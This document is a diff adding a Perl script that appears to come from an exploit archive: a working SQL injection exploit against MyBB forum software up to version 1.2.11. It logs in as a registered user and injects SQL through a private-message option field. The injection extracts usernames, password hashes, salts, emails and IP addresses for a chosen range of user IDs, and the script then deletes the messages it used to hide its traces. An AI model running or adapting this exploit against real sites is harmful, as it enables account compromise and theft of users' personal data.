@@ -1,0 +1,152 @@
+#!/usr/bin/perl
+
+#
+# MyBB <=1.2.11 SQL Injection Exploit based on http://www.waraxe.us/advisory-64.html
+#
+# Needs MySQL >=4.1 and a valid registration.
+#
+# By F
+#
+
+use IO::Socket;
+use LWP::UserAgent;
+use HTTP::Cookies;
+use HTML::Entities;
+
+####
+
+	print("\n");
+	print("############################################################################\n");
+	print("#                 MyBB <=1.2.11 SQL Injection Exploit by F                 #\n");
+	print("############################################################################\n");
+
+if(@ARGV<5){
+	print("# Usage: perl mybb1211.pl host path user pass victim_uid [last_victim_uid] #\n");
+	print("############################################################################\n");
+	exit;
+};
+
+$host="http://".$ARGV[0];
+$path=$ARGV[1];
+$user=$ARGV[2];
+$pass=$ARGV[3];
+$vid1=$ARGV[4];
+
+if(@ARGV<=5){
+	$vidn=$vid1;
+}else{
+	$vidn=$ARGV[5];
+};
+
+print("\n");
+print(" [~] Host: ".$host."\n");
+print(" [~] Path: ".$path."\n");
+print(" [~] User: ".$user."\n");
+print(" [~] Pass: ".$pass."\n");
+print(" [~] From  #".$vid1."\n");
+print(" [~] To    #".$vidn."\n");
+print("\n");
+
+####
+
+# create $browser and $cookie_jar
+$browser=LWP::UserAgent->new() or die(" [-] Cannot create new UserAgent\n");
+$cookie_jar=HTTP::Cookies->new();
+$browser->cookie_jar($cookie_jar);
+
+# try to log in
+$result=$browser->post(
+	$host.$path."member.php",
+	Content=>[
+		"action"=>"do_login",
+		"username"=>$user,
+		"password"=>$pass,
+		"url"=>$host.$path."index.php",
+		"submit"=>"Login",
+	],
+);
+
+# check cookie
+if($cookie_jar->as_string=~m/mybbuser=.*?;/){
+	print(" [+] Login successful\n");
+}else{
+	print(" [-] Login unsuccessful\n");
+	exit;
+};
+
+# try to get uid
+$result=$browser->get($host.$path."usercp.php");
+
+# check result
+if($result->as_string=~m/member\.php\?action=profile&amp;uid=([0-9]*?)"/){
+	$uid=$1;
+	print(" [+] Getting uid successful: ".$uid."\n");
+}else{
+	print(" [-] Getting uid unsuccessful\n");
+	exit;
+};
+
+# construct exploit
+$exploit ="yes','0','0'),";
+$exploit.="('".$uid."','".$uid."','".$uid."','1','haxx_result','0',concat('(haxx_start)',";
+for($vid=$vid1;$vid<=$vidn;$vid++){
+	$exploit.="ifnull((select concat(uid,'-',username,':',password,':',salt,'::',email,'-',usergroup,'-',additionalgroups,'-',website,'-',regip,'(haxx_delim)') from mybb_users where uid=".$vid."),''),";
+};
+$exploit.="'(haxx_end)'),'".time()."','0','no','yes";
+
+# try to send exploit
+$result=$browser->post(
+	$host.$path."private.php",
+	Content=>[
+		"action"=>"do_send",
+		"subject"=>"haxx_message=".(1+rand(65536)),
+		"message"=>"nuthin".(1+rand(65536)),
+		"to"=>$user,
+		"options[disablesmilies]"=>$exploit,
+	],
+);
+
+# check if user is valid
+if(	($result->as_string=~m/Your account has either been suspended or you have been banned from accessing this resource\./) ||
+	($result->as_string=~m/You do not have permission to access this page\./) ||
+	($result->as_string=~m/Your account may still be awaiting activation or moderation\./)
+){
+	print(" [-] User has no permission to send private messages. This can happen if the user is suspended, banned, unactivated, or for other similar reasons.\n");
+	exit;
+};
+
+# check the 5 minute cap
+if($result->as_string=~m/You have already submitted the same private message to the same recipient within the last 5 minutes\./){
+	print(" [-] Unsuccessful attempt to fool MyBB with the 5 minute limit on sending private messages. Please run the exploit again.\n");
+	exit;
+};
+
+# delete auxiliary message
+$result=$browser->get($host.$path."private.php?fid=1");
+if($result->as_string=~m/private\.php\?action=read&amp;pmid=([0-9]*?)">haxx_message=[0-9]*?</){
+	print(" [+] The auxiliary message was found and successfully deleted\n");
+	$pmid=$1;
+	$browser->get($host.$path."private.php?action=delete&pmid=".$pmid);
+}else{
+	print(" [-] Warning! The auxiliary message wasn't found and could not be deleted!\n");
+};
+
+# download and delete result message
+if($result->as_string=~m/private\.php\?action=read&amp;pmid=([0-9]*?)">haxx_result</){
+	print(" [+] The result message was found. Getting hashes.\n\n");
+	$pmid=$1;
+	$result=$browser->get($host.$path."private.php?action=read&pmid=".$pmid);
+	if($result->as_string=~m/\(haxx_start\)(.*)\(haxx_end\)/s){
+		$pm=$1;
+		$pm=~s/\(haxx_delim\)/\n/g;
+		$pm=~s/<br \/>//g;
+		$pm=decode_entities($pm);
+		print($pm);
+	};
+	$browser->get($host.$path."private.php?action=delete&pmid=".$pmid);
+}else{
+	print(" [-] The result message wasn't found. Exploit failed!\n");
+	exit;
+};
+
+# milw0rm.com [2008-02-06]
